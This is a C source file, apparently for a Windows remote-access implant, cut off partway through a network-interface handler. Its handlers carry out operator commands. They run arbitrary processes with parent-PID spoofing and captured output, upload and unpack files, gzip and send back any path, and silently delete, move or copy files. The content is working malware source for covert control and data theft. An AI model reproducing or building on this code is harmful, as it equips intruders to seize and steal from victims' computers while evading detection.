#include "pch.h"

LONG ContinuableExceptionHanlder
(
	_In_ PEXCEPTION_POINTERS ExceptionInfo
)
{
	DWORD dwExpceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
	LPWSTR lpErrorDesc = NULL;
	LPSTR lpTempStr = NULL;
	DWORD dwTlsIdx = 0;

	lpErrorDesc = (LPWSTR)ExceptionInfo->ExceptionRecord->ExceptionInformation[0];
	if (dwExpceptionCode == EXCEPTION_BREAKPOINT && lpErrorDesc != NULL) {
		dwTlsIdx = TlsAlloc();
		if (dwTlsIdx != TLS_OUT_OF_INDEXES) {
			lpTempStr = ConvertWcharToChar(lpErrorDesc);
			TlsSetValue(dwTlsIdx - 1, lpTempStr);
			TlsFree(dwTlsIdx);
		}
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	else {
		return EXCEPTION_CONTINUE_SEARCH;
	}
}

PENVELOPE CdHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	DWORD dwNumberOfBytesRead = 0;
	PBUFFER* pTemp = NULL;
	LPSTR lpRespData = NULL;
	PENVELOPE pRespEnvelope = NULL;
	LPSTR lpNewPath = NULL;
	DWORD dwReturnedLength = 0;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;

	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	lpNewPath = DuplicateStrA(pTemp[0]->pBuffer, 2);
	if (lpNewPath[lstrlenA(lpNewPath) - 1] != '\\') {
		lstrcatA(lpNewPath, "\\");
	}

	if (!SetCurrentDirectoryA(lpNewPath)) {
		LOG_ERROR("SetCurrentDirectoryA", GetLastError());
		goto CLEANUP;
	}
	
	lpRespData = ALLOC(MAX_PATH);
	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
	if (lstrlenA(lpRespData) == 0) {
		lpRespData = REALLOC(lpRespData, dwReturnedLength);
		GetCurrentDirectoryA(dwReturnedLength, lpRespData);
	}

	FreeElement(pElement);
	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
	pElement->pMarshalledData = NULL;
	pElement->cbMarshalledData = 0;
CLEANUP:
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpNewPath != NULL) {
		FREE(lpNewPath);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	FreeElement(pElement);
	return pRespEnvelope;
}

PENVELOPE ExecuteHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[6];
	PPBElement RespElementList[4];
	PPBElement pFinalElement = NULL;
	LPVOID* UnmarshalledData = NULL;
	LPSTR lpStdOutPath = NULL;
	LPSTR lpStdErrPath = NULL;
	LPSTR lpPath = NULL;
	DWORD i = 0;
	DWORD dwArgc = 0;
	BOOL Output = FALSE;
	DWORD dwParentPid = 0;
	LPSTR lpCommandLine = NULL;
	STARTUPINFOEXA StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	DWORD cbAttributes = 0;
	HANDLE hParentProcess = NULL;
	HANDLE hStdOut = INVALID_HANDLE_VALUE;
	HANDLE hStdErr = INVALID_HANDLE_VALUE;
	DWORD dwExitCode = 0;
	PBYTE pOutputBuffer = NULL;
	DWORD cbOutputBuffer = 0;
	PBYTE pErrorBuffer = NULL;
	DWORD cbErrorBuffer = 0;
	LPWSTR lpTempPath = NULL;
	SECURITY_ATTRIBUTES SecurityAttributes;

	SecureZeroMemory(RecvElementList, sizeof(RecvElementList));
	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
	}

	RecvElementList[5]->dwFieldIdx = 10;
	RecvElementList[0]->Type = Bytes;
	RecvElementList[1]->Type = RepeatedBytes;
	RecvElementList[2]->Type = Varint;
	RecvElementList[3]->Type = Bytes;
	RecvElementList[4]->Type = Bytes;
	RecvElementList[5]->Type = Varint;
	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL && UnmarshalledData[0] != NULL) {
		goto CLEANUP;
	}

	lpPath = ExpandToFullPathA(((PBUFFER)(UnmarshalledData[0]))->pBuffer);
	if (UnmarshalledData[3] != NULL) {
		lpStdOutPath = ExpandToFullPathA(((PBUFFER)(UnmarshalledData[3]))->pBuffer);
	}

	if (UnmarshalledData[4] != NULL) {
		lpStdErrPath = ExpandToFullPathA(((PBUFFER)(UnmarshalledData[4]))->pBuffer);
	}

	lpCommandLine = DuplicateStrA(lpPath, 1);
	if (UnmarshalledData[1] != NULL) {
		lstrcatA(lpCommandLine, " ");
		dwArgc = *(PDWORD)(UnmarshalledData[1]);
		for (i = 0; i < dwArgc; i++) {
			lpCommandLine = StrCatExA(lpCommandLine, ((PBUFFER*)(UnmarshalledData[1]))[i]->pBuffer);
			lpCommandLine = StrCatExA(lpCommandLine, " ");
		}
	}

	Output = (BOOL)UnmarshalledData[2];
	dwParentPid = (DWORD)UnmarshalledData[5];
	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	if (dwParentPid > 0) {
		hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentPid);
		if (hParentProcess == NULL) {
			LOG_ERROR("OpenProcess", GetLastError());
			goto CLEANUP;
		}

		InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributes);
		StartupInfo.lpAttributeList = ALLOC(cbAttributes);
		UpdateProcThreadAttribute(StartupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(hParentProcess), NULL, NULL);
	}

	if (Output) {
		if (lpStdOutPath == NULL) {
			lpStdOutPath = GenerateTempPathA(NULL, ".txt", NULL);
		}

		if (lpStdErrPath == NULL) {
			lpStdErrPath = GenerateTempPathA(NULL, ".txt", NULL);
		}

		SecureZeroMemory(&SecurityAttributes, sizeof(SecurityAttributes));
		SecurityAttributes.nLength = sizeof(SecurityAttributes);
		SecurityAttributes.lpSecurityDescriptor = NULL;
		SecurityAttributes.bInheritHandle = TRUE;
		StartupInfo.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;

		hStdOut = CreateFileA(lpStdOutPath, GENERIC_WRITE, 0, &SecurityAttributes, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hStdOut == INVALID_HANDLE_VALUE) {
			LOG_ERROR("CreateFileA", GetLastError());
			goto CLEANUP;
		}

		StartupInfo.StartupInfo.hStdOutput = hStdOut;
		if (!lstrcmpA(lpStdOutPath, lpStdErrPath) && UnmarshalledData[3] != NULL && UnmarshalledData[4] != NULL) {
			StartupInfo.StartupInfo.hStdError = hStdOut;
		}
		else {
			hStdErr = CreateFileA(lpStdErrPath, GENERIC_WRITE, 0, &SecurityAttributes, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hStdErr == INVALID_HANDLE_VALUE) {
				LOG_ERROR("CreateFileA", GetLastError());
				goto CLEANUP;
			}

			StartupInfo.StartupInfo.hStdError = hStdErr;
		}
	}

	StartupInfo.StartupInfo.cb = sizeof(StartupInfo);
	if (!CreateProcessA(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo)) {
		LOG_ERROR("CreateProcessA", GetLastError());
		goto CLEANUP;
	}

	SecureZeroMemory(RespElementList, sizeof(RespElementList));
	RespElementList[3] = CreateVarIntElement(GetProcessId(ProcessInfo.hProcess), 4);
	if (Output) {
		WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
		CloseHandle(hStdOut);
		hStdOut = INVALID_HANDLE_VALUE;
		if (UnmarshalledData[3] == NULL) {
			lpTempPath = ConvertCharToWchar(lpStdOutPath);
			pOutputBuffer = ReadFromFile(lpTempPath, &cbOutputBuffer);
			RespElementList[1] = CreateBytesElement(pOutputBuffer, cbOutputBuffer, 2);
			FREE(lpTempPath);
			DeleteFileA(lpStdOutPath);
		}
		
		CloseHandle(hStdErr);
		hStdErr = INVALID_HANDLE_VALUE;
		if (UnmarshalledData[4] == NULL) {
			lpTempPath = ConvertCharToWchar(lpStdErrPath);
			pErrorBuffer = ReadFromFile(lpTempPath, &cbErrorBuffer);
			RespElementList[2] = CreateBytesElement(pErrorBuffer, cbErrorBuffer, 3);
			FREE(lpTempPath);
			DeleteFileA(lpStdErrPath);
		}

		GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode);
		RespElementList[0] = CreateVarIntElement(dwExitCode, 1);
	}

	pFinalElement = CreateStructElement(RespElementList, _countof(RespElementList), 0);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (ProcessInfo.hThread != NULL) {
		CloseHandle(ProcessInfo.hThread);
	}

	if (ProcessInfo.hProcess != NULL) {
		CloseHandle(ProcessInfo.hProcess);
	}

	if (UnmarshalledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshalledData[0]);
		FreeBuffer((PBUFFER)UnmarshalledData[3]);
		FreeBuffer((PBUFFER)UnmarshalledData[4]);
		if (UnmarshalledData[1] != NULL) {
			for (i = 1; i <= dwArgc; i++) {
				FreeBuffer(((PBUFFER*)UnmarshalledData[1])[i]);
			}

			FREE(UnmarshalledData[1]);
		}

		FREE(UnmarshalledData);
	}

	if (pOutputBuffer != NULL) {
		FREE(pOutputBuffer);
	}

	if (pErrorBuffer != NULL) {
		FREE(pErrorBuffer);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpCommandLine != NULL) {
		FREE(lpCommandLine);
	}

	if (lpStdOutPath != NULL) {
		FREE(lpStdOutPath);
	}

	if (lpStdErrPath != NULL) {
		FREE(lpStdErrPath);
	}

	if (StartupInfo.lpAttributeList != NULL) {
		FREE(StartupInfo.lpAttributeList);
	}

	if (hParentProcess != NULL) {
		CloseHandle(hParentProcess);
	}

	if (hStdOut != INVALID_HANDLE_VALUE) {
		CloseHandle(hStdOut);
	}

	if (hStdErr != INVALID_HANDLE_VALUE) {
		CloseHandle(hStdErr);
	}

	FreeElement(pFinalElement);
	return pRespEnvelope;
}

PENVELOPE UploadHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[4];
	LPVOID* UnmarshalledData = NULL;
	LPSTR lpPath = NULL;
	DWORD i = 0;
	PBUFFER pData = NULL;
	LPWSTR lpTempStr = NULL;
	LPWSTR lpZipPath = NULL;
	BOOL IsDirectory = FALSE;
	LPSTR lpFileName = NULL;

	SecureZeroMemory(RecvElementList, sizeof(RecvElementList));
	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	RecvElementList[3]->Type = Varint;
	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] != NULL) {
		lpPath = DuplicateStrA(((PBUFFER*)UnmarshalledData)[0]->pBuffer, 0);
		lpTempStr = ConvertCharToWchar(lpPath);
		if (!IsFolderExist(lpTempStr)) {
			LogError(L"Folder %s is not exist", lpTempStr);
			goto CLEANUP;
		}
	}
	else {
		lpPath = ALLOC(MAX_PATH);
		GetCurrentDirectoryA(MAX_PATH, lpPath);
		lpTempStr = ConvertCharToWchar(lpPath);
	}

	if (UnmarshalledData[2] != NULL) {
		lpFileName = DuplicateStrA(((PBUFFER*)UnmarshalledData)[2]->pBuffer, 0);
	}

	pData = ((PBUFFER*)UnmarshalledData)[1];
	UnmarshalledData[1] = NULL;
	IsDirectory = ((PBOOL)UnmarshalledData)[3];
	UnmarshalledData[1] = NULL;
	if (IsDirectory) {
		GenerateTempPathW(NULL, L".zip", NULL, &lpZipPath);
		if (!WriteToFile(lpZipPath, pData->pBuffer, pData->cbBuffer)) {
			goto CLEANUP;
		}

		Unzip(lpZipPath, lpTempStr);
		DeleteFileW(lpZipPath);
	}
	else {
		if (lpPath[lstrlenA(lpPath) - 1] != '\\') {
			lpPath = StrCatExA(lpPath, "\\");
		}

		lpPath = StrCatExA(lpPath, lpFileName);
		if (!WriteToFileA(lpPath, pData->pBuffer, pData->cbBuffer)) {
			goto CLEANUP;
		}
	}

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
CLEANUP:
	if (UnmarshalledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshalledData[0]);
		FreeBuffer((PBUFFER)UnmarshalledData[1]);
		FreeBuffer((PBUFFER)UnmarshalledData[2]);
		FreeBuffer((PBUFFER)UnmarshalledData[3]);

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpTempStr != NULL) {
		FREE(lpTempStr);
	}

	if (lpZipPath != NULL) {
		FREE(lpZipPath);
	}

	FreeBuffer(pData);
	return pRespEnvelope;
}

PENVELOPE DownloadHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement pRecvElement = NULL;
	PPBElement pRespElement[2];
	PPBElement pFinalElement = NULL;
	LPVOID* UnmarshalledData = NULL;
	LPSTR lpPath = NULL;
	DWORD i = 0;
	PBUFFER pData = NULL;
	LPWSTR lpTempStr = NULL;
	LPWSTR lpZipPath = NULL;
	BOOL IsDirectory = FALSE;

	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->dwFieldIdx = i + 1;
	pRecvElement->Type = Bytes;
	UnmarshalledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL || UnmarshalledData[0] == NULL) {
		goto CLEANUP;
	}

	lpPath = DuplicateStrA(((PBUFFER*)UnmarshalledData)[0]->pBuffer, 0);
	lpTempStr = ConvertCharToWchar(lpPath);
	if (!IsPathExist(lpTempStr)) {
		LogError(L"%s is not exist", lpTempStr);
		goto CLEANUP;
	}

	if (IsFolderExist(lpTempStr)) {
		IsDirectory = TRUE;
	}

	GenerateTempPathW(NULL, L".tar.gz", NULL, &lpZipPath);
	CompressPathByGzip(lpTempStr, lpZipPath);
	pData = ALLOC(sizeof(BUFFER));
	pData->pBuffer = ReadFromFile(lpZipPath, &pData->cbBuffer);
	if (pData->pBuffer == NULL || pData->cbBuffer == 0) {
		goto CLEANUP;
	}

	DeleteFileW(lpZipPath);
	pRespElement[0] = CreateBytesElement(pData->pBuffer, pData->cbBuffer, 1);
	pRespElement[1] = CreateVarIntElement(IsDirectory, 2);

	pFinalElement = CreateStructElement(pRespElement, _countof(pRespElement), 0);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (UnmarshalledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshalledData[0]);
		FREE(UnmarshalledData);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpTempStr != NULL) {
		FREE(lpTempStr);
	}

	if (lpZipPath != NULL) {
		FREE(lpZipPath);
	}

	FreeElement(pRecvElement);
	FreeElement(pFinalElement);
	FreeBuffer(pData);

	return pRespEnvelope;
}

PENVELOPE MkdirHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	DWORD dwNumberOfBytesRead = 0;
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD dwReturnedLength = 0;
	LPWSTR lpPath = NULL;
	DWORD dwErrorCode = ERROR_SUCCESS;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;

	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	lpPath = ConvertCharToWchar(pTemp[0]->pBuffer);
	if (lpPath[lstrlenW(lpPath) - 1] == L'\\') {
		lpPath[lstrlenW(lpPath) - 1] = L'\0';
	}

	dwErrorCode = SHCreateDirectory(NULL, lpPath);
	if (dwErrorCode != ERROR_SUCCESS) {
		LOG_ERROR("SHCreateDirectory", dwErrorCode);
		goto CLEANUP;
	}

	FreeElement(pElement);
	pElement = CreateBytesElement(pTemp[0]->pBuffer, lstrlenA(pTemp[0]->pBuffer), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
	pElement->pMarshalledData = NULL;
	pElement->cbMarshalledData = 0;
CLEANUP:
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	FreeElement(pElement);
	return pRespEnvelope;
}

PENVELOPE PingHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pRecvElement = NULL;
	PPBElement pFinalElement = NULL;
	DWORD dwNumberOfBytesRead = 0;
	PUINT64 UnmarshalledData = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD dwReturnedLength = 0;
	UINT64 uNonce = 0;

	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = Varint;
	pRecvElement->dwFieldIdx = 1;
	UnmarshalledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	uNonce = UnmarshalledData[0];

	pFinalElement = CreateVarIntElement(uNonce, 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;

	FreeElement(pRecvElement);
	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RmHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[3];
	PPBElement RespElement;
	PBUFFER* pTemp = NULL;
	LPSTR lpRespData = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	BOOL Force = FALSE;
	BOOL Recursive = FALSE;
	LPWSTR lpConvertedPath = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	DWORD dwErrorCode = ERROR_SUCCESS;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Varint;
	Element[2]->Type = Varint;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpConvertedPath = ConvertCharToWchar(pTemp[0]->pBuffer);
	if (pTemp[1] != 0) {
		Recursive = TRUE;
	}

	if (pTemp[2] != 0) {
		Force = TRUE;
	}

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_DELETE;
	ShFileStruct.pFrom = DuplicateStrW(lpConvertedPath, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	dwErrorCode = SHFileOperationW(&ShFileStruct);
	if (dwErrorCode != ERROR_SUCCESS) {
		LOG_ERROR("SHFileOperationW", dwErrorCode);
		goto CLEANUP;
	}

	lpRespData = DuplicateStrA(pTemp[0]->pBuffer, 0);
	RespElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = RespElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = RespElement->cbMarshalledData;
	RespElement->pMarshalledData = NULL;
	RespElement->cbMarshalledData = 0;
CLEANUP:
	if (ShFileStruct.pFrom != NULL) {
		FREE(ShFileStruct.pFrom);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpConvertedPath != NULL) {
		FREE(lpConvertedPath);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	FreeElement(RespElement);
	return pRespEnvelope;
}

PENVELOPE MvHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[2];
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	LPWSTR lpSrc = NULL;
	LPWSTR lpDest = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	DWORD dwErrorCode = ERROR_SUCCESS;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Bytes;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_MOVE;
	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	dwErrorCode = SHFileOperationW(&ShFileStruct);
	if (dwErrorCode != ERROR_SUCCESS) {
		LOG_ERROR("SHFileOperationW", dwErrorCode);
		goto CLEANUP;
	}

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
CLEANUP:
	if (ShFileStruct.pFrom != NULL) {
		FREE(ShFileStruct.pFrom);
	}

	if (ShFileStruct.pTo != NULL) {
		FREE(ShFileStruct.pTo);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FreeBuffer(pTemp[1]);
		FREE(pTemp);
	}

	if (lpSrc != NULL) {
		FREE(lpSrc);
	}

	if (lpDest != NULL) {
		FREE(lpDest);
	}

	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	return pRespEnvelope;
}

PENVELOPE CpHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[2];
	PPBElement RespElementList[3];
	PPBElement RespElement = NULL;
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	LPWSTR lpSrc = NULL;
	LPWSTR lpDest = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	DWORD dwErrorCode = ERROR_SUCCESS;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Bytes;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_COPY;
	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	dwErrorCode = SHFileOperationW(&ShFileStruct);
	if (dwErrorCode != ERROR_SUCCESS) {
		LOG_ERROR("SHFileOperationW", dwErrorCode);
		goto CLEANUP;
	}

	RespElementList[0] = CreateBytesElement(pTemp[0]->pBuffer, lstrlenA(pTemp[0]->pBuffer), 1);
	RespElementList[1] = CreateBytesElement(pTemp[1]->pBuffer, lstrlenA(pTemp[1]->pBuffer), 2);
	RespElementList[2] = CreateVarIntElement(GetFileSizeByPath(lpSrc), 3);
	RespElement = CreateStructElement(RespElementList, _countof(RespElementList), 0);

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = RespElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = RespElement->cbMarshalledData;

	RespElement->pMarshalledData = NULL;
	RespElement->cbMarshalledData = 0;
CLEANUP:
	if (ShFileStruct.pFrom != NULL) {
		FREE(ShFileStruct.pFrom);
	}

	if (ShFileStruct.pTo != NULL) {
		FREE(ShFileStruct.pTo);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FreeBuffer(pTemp[1]);
		FREE(pTemp);
	}

	if (lpSrc != NULL) {
		FREE(lpSrc);
	}

	if (lpDest != NULL) {
		FREE(lpDest);
	}

	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	FreeElement(RespElement);

	return pRespEnvelope;
}

PENVELOPE PwdHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	LPSTR lpRespData = NULL;
	DWORD dwReturnedLength = 0;
	PENVELOPE pRespEnvelope = NULL;

	lpRespData = ALLOC(MAX_PATH);
	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
	if (lstrlenA(lpRespData) == 0) {
		lpRespData = REALLOC(lpRespData, dwReturnedLength);
		GetCurrentDirectoryA(dwReturnedLength, lpRespData);
	}

	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
	pElement->pMarshalledData = NULL;
	pElement->cbMarshalledData = 0;
CLEANUP:
	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	FreeElement(pElement);

	return pRespEnvelope;
}

LPSTR SocketAddressToStr
(
	_In_ LPSOCKADDR lpSockAddr
)
{
	LPWSTR lpTemp = NULL;
	LPSTR lpResult = NULL;
	DWORD cbTemp = 0x100;
	NTSTATUS Status = STATUS_SUCCESS;

	LPSOCKADDR_IN6 SockIp6 = NULL;
	LPSOCKADDR_IN SockIp = NULL;
	if (lpSockAddr->sa_family == AF_INET) {
		lpTemp = ALLOC(cbTemp * sizeof(WCHAR));
		SockIp = (LPSOCKADDR_IN)(lpSockAddr);
		Status = RtlIpv4AddressToStringExW(&SockIp->sin_addr, 0, lpTemp, &cbTemp);
		if (Status != STATUS_SUCCESS) {
			FREE(lpTemp);
			return NULL;
		}

		lpResult = ConvertWcharToChar(lpTemp);
		FREE(lpTemp);
		return lpResult;
	}
	else if (lpSockAddr->sa_family == AF_INET6) {
		lpTemp = ALLOC(cbTemp * sizeof(WCHAR));
		SockIp6 = (LPSOCKADDR_IN6)(lpSockAddr);
		Status = RtlIpv6AddressToStringExW(&SockIp6->sin6_addr, SockIp6->sin6_scope_id, 0, lpTemp, &cbTemp);
		if (Status != STATUS_SUCCESS) {
			FREE(lpTemp);
			return NULL;
		}

		lpResult = ConvertWcharToChar(lpTemp);
		FREE(lpTemp);
		return lpResult;
	}
	else {
		return NULL;
	}
}

PENVELOPE IfconfigHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PIP_ADAPTER_ADDRESSES pAdapterInfo = NULL;
	PIP_ADAPTER_ADDRESSES pTemp = NULL;
	DWORD cbAdapterInfo = sizeof(IP_ADAPTER_ADDRESSES);
	DWORD dwErrorCode = ERROR_SUCCESS;
	DWORD i = 0;
	CHAR szTempBuffer[0x200];
	LPSTR lpUnicastAddr = NULL;
	LPSTR lpGateWayAddr = NULL;
